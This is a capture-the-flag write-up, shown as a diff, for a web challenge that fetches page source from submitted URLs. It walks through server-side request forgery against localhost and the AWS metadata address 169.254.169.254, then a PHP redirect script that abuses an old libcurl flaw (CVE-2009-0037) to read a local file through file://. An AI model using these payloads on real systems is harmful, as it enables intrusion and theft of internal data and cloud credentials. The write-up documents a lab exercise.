@@ -1,0 +1,58 @@
+Challenge Description:
+This service lets you see the source code of your website:
+
+Challenge URL:
+https://let-me-see.pwn.institute/
+
+Steps to solve:
+You're presented with a form where you input URL to any website.
+Once you submit the url in the response you receive page source of that website.
+URLs must start with http://
+
+My first idea was SSRF.
+
+So I started with:
+url=http://localhost
+
+As a response I got source code of the Challenge front page and a message:
+Your IP is 127.0.0.1 - PRIVILEGE MODE ENABLED.
+
+Second try:
+url=http://localhost/flag.txt
+I got the response "wrong way"
+
+Third try:
+url=http://localhost/?url=http://localhost/flag.txt
+I got the response "wrong way" once again.
+
+as url parameter must start with http://
+all tries with https:// file:// gopher:// protocol failed.
+
+Then I took a 3 hour long detour in the AWS rabbit hole:
+ASW cloud magic link:
+url=http://169.254.169.254/
+
+it showed some of the AWS data (public keys, cloud config etc), but going deeper didn't gave
+me anything I can work with.
+(like ASW instance access tokens).
+
+Final try:
+At the end someone pointed to me that I should look how requests are being made to external URLs.
+As URL I've entered my burpcollaborator URL and got a connection back.
+User agent: libcurl/7.19.3
+Quick search for version vulnerabilities gave me this:
+https://nvd.nist.gov/vuln/detail/CVE-2009-0037
+
+
+In order to exploit this I've created a simple PHP script that redirects visitor to file://flag.txt:
+<?php
+header("Location: file://flag.txt");
+?>
+
+Uploaded it to public server:
+http://myserver.something/redirect.php
+
+And then the final URL I've submitted looked like this:
+url=http://localhost/?url=http://myserver.something/redirect.php
+
+CURL hits my php script and gets redirected to file protocol leaking the flag back to me.
